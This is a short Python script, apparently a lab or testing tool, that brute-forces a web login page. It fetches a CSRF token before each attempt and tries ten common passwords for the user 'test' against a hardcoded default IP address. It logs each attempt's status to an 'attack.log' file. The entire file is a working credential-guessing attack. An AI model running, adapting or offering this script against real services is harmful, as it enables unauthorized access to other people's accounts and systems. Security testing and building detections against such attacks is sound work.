import datetime
import os
import time
from urllib.parse import urljoin

import requests

try:
    from dotenv import load_dotenv
except ImportError:
    load_dotenv = None

if load_dotenv:
    load_dotenv()

base_url = os.environ.get("TARGET_BASE_URL", "http://117.16.174.60:5000")
login_url = os.environ.get("TARGET_LOGIN_URL", urljoin(base_url.rstrip("/") + "/", "login"))
csrf_url = os.environ.get("TARGET_CSRF_URL", urljoin(base_url.rstrip("/") + "/", "csrf-token"))
log_file = os.environ.get("ATTACK_LOG_FILE", "attack.log")

payloads = [
    {"username": "test", "password": "1111"},
    {"username": "test", "password": "1234"},
    {"username": "test", "password": "admin"},
    {"username": "test", "password": "password"},
    {"username": "test", "password": "qwer"},
    {"username": "test", "password": "asdf"},
    {"username": "test", "password": "zxcv"},
    {"username": "test", "password": "0000"},
    {"username": "test", "password": "9999"},
    {"username": "test", "password": "guest"},
]

def write_log(message: str) -> None:
    with open(log_file, "a", encoding="utf-8") as f:
        f.write(message + "\n")


def get_csrf_token(session: requests.Session) -> str:
    response = session.get(csrf_url, timeout=5)
    response.raise_for_status()
    token = response.json().get("csrf_token")
    if not token:
        raise ValueError("csrf_token missing from response")
    return token


with requests.Session() as session:
    for i, credentials in enumerate(payloads, start=1):
        now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        username = credentials["username"]
        password = credentials["password"]

        try:
            csrf_token = get_csrf_token(session)
            login_payload = {
                "username": username,
                "password": password,
                "csrf_token": csrf_token,
            }
            res = session.post(
                login_url,
                json=login_payload,
                headers={"X-CSRF-Token": csrf_token},
                timeout=5,
            )

            log_line = (
                f"{now} | brute_force | attempt={i} | "
                f"user={username} | pw_length={len(password)} | status={res.status_code}"
            )
            print(log_line)
            write_log(log_line)

        except (requests.RequestException, ValueError) as e:
            log_line = (
                f"{now} | brute_force | attempt={i} | "
                f"user={username} | pw_length={len(password)} | error={e}"
            )
            print(log_line)
            write_log(log_line)

        time.sleep(0.5)
